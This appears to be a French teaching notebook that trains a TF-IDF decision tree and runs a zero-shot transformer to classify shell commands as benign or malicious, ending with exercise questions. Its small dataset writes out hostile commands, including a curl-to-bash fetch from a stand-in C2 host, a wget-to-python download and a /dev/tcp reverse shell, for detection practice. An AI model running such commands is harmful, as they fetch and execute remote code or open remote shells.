In [ ]:
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.tree import DecisionTreeClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
from transformers import pipeline

In [ ]:
# 1. Dataset cyber minimaliste (commandes bénignes vs malveillantes/obfusquées)
data = {
    "command": [
        "ls -la /var/log",
        "cat /etc/passwd",
        "curl http://malicious-c2.net/payload.sh | bash",
        "python3 -m http.server 8080",
        "powershell -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGo...",
        "sudo systemctl restart nginx",
        "wget -qO- 192.168.1.50/rev.py | python",
        "grep -rnw '/home/user/' -e 'password'",
        "nc -lvnp 4444",
        "df -h",
        "rm -rf /tmp/test",
        "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
    ],
    "label": [0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1]  # 0: Benign, 1: Malicious
}

In [ ]:
df = pd.DataFrame(data)
# Split directly on raw text so both models evaluate the identical test set
X_text_train, X_text_test, y_train, y_test = train_test_split(
    df["command"], df["label"], test_size=0.3, random_state=12, stratify=df["label"]
)

In [ ]:
# 2. Baseline: TF-IDF (char n-grams) + Decision Tree
vectorizer = TfidfVectorizer(analyzer="char_wb", ngram_range=(3, 5))
X_train_vec = vectorizer.fit_transform(X_text_train)
X_test_vec = vectorizer.transform(X_text_test)

dt_clf = DecisionTreeClassifier(max_depth=3, random_state=42)
dt_clf.fit(X_train_vec, y_train)

dt_preds = dt_clf.predict(X_test_vec)

print("=== Baseline: TF-IDF + Decision Tree ===")
print(classification_report(y_test, dt_preds, target_names=["Benign", "Malicious"], zero_division=0))

In [ ]:
# 3. Transformer: Hugging Face Zero-Shot Classification on X_test
classifier = pipeline("zero-shot-classification", model="valhalla/distilbart-mnli-12-3")

candidate_labels = ["Benign", "Malicious"]
label_mapping = {
    "Benign": 0,
    "Malicious": 1
}

# Run inference on all test texts
hf_outputs = classifier(list(X_text_test), candidate_labels=candidate_labels)

# Extract predicted class: take the highest-scoring label and map to int (0 or 1)
hf_preds = [label_mapping[out["labels"][0]] for out in hf_outputs]

print("=== Hugging Face Zero-Shot Model ===")
print(classification_report(y_test, hf_preds, target_names=["Benign", "Malicious"], zero_division=0))

## À faire : 
1- Répondre aux questions suivantes : 
    a. Pourquoi n'a-t-on pas eu à entrainer le Transformer? 
    b. Est-ce qu'on peut juste utiliser transformer pour tous nos travaux?